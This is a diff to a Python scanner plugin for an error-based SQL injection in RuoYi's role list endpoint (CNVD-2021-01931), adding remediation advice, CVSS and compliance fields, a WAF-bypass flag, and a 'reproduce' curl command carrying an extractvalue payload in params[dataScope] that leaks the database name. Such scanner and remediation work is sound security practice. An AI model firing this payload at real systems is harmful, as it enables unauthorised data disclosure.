@@ -7,11 +7,37 @@ from lib.http import host_of, join_url
 
 class SqlInjectRolePlugin(PluginBase):
     name = 'POST型报错注入（role）'
-    cve = ''
+    cve = 'CNVD-2021-01931'
     severity = 'high'
     category = 'vuln'
     description = '/system/role/list 的 params[dataScope] 参数拼接 extractvalue 报错注入，泄露 database()'
     fix = '对 dataScope 参数做白名单校验，禁止拼接 SQL，使用参数化查询'
+    fix_detail = (
+        '【升级方案】升级 RuoYi 至 4.6.0+（该版本已修复 params[dataScope] 注入）\n'
+        '【代码修复】修改 SysRoleMapper.xml，对 dataScope 参数做白名单校验：\n'
+        '  - 修改前：${params.dataScope}（直接拼接）\n'
+        '  - 修改后：使用 DataScopeUtil.checkDataScope(params.get("dataScope")) 白名单校验\n'
+        '【配置加固】启用 MyBatis 参数化：mybatis.configuration.safe-result-handler-enabled: true\n'
+        '【WAF 规则】拦截包含 extractvalue/updatexml/concat 的 dataScope 参数\n'
+        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验'
+    )
+    reproduce = (
+        'curl -X POST "http://target/system/role/list" \\\n'
+        '  -H "Content-Type: application/x-www-form-urlencoded" \\\n'
+        '  -H "Accept: application/json" \\\n'
+        '  -d \'params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))\' \\\n'
+        '  --cookie ""\n'
+        '\n'
+        '# 预期响应：HTTP 500 + 响应体含 "运行时异常" 或 "database()" 报错特征'
+    )
+    # D2：params[dataScope] 注入在 4.6.0 已修复
+    affected_versions = '>=4.0,<4.6'
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N'
+    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
+    # D7: WAF 绕过支持
+    vuln_type = 'sqli'
+    supports_waf_bypass = True
 
     def verify(self, target, session):
         host = host_of(target)
